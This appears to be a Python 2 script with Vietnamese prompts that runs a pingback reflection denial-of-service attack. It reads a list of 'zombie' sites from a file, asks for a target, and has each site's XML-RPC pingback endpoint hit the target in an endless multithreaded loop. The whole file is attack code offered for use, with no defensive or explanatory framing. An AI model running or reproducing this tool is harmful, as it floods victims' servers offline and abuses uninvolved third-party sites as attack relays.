

from scapy.all import *
import requests
class myThread (threading.Thread):
    def __init__(self, threadID, name, counter,source,target):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        self.counter = counter
        self.source=source
        self.target=target
    def run(self):
        print "Bat dau " + self.name
        PingBack(self.source,self.target )
        # threadLock.release()


def PingBack(source,target ):
	global f1
	global f2

	url=source+"/xmlrpc/pingback"
	my_data='''
<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param>
<value>'''+target+'''</value>
</param>
<param>
<value>'''+source+'''</value>
</param>
</params>
</methodCall>
	'''
	while True:
		try:
			kq= requests.post(url,data=my_data)
		except Exception as e:
			raise
	
	


s=open('zombie.txt','r').read()
Listsource=s.split('\n')


target=input("Nhap target : ")


thread = []
for i in range(len(Listsource)):
	thread.append('')
	thread[i] = myThread(i, "Thread " + str(i), i,Listsource[i],target)
	thread[i].start()
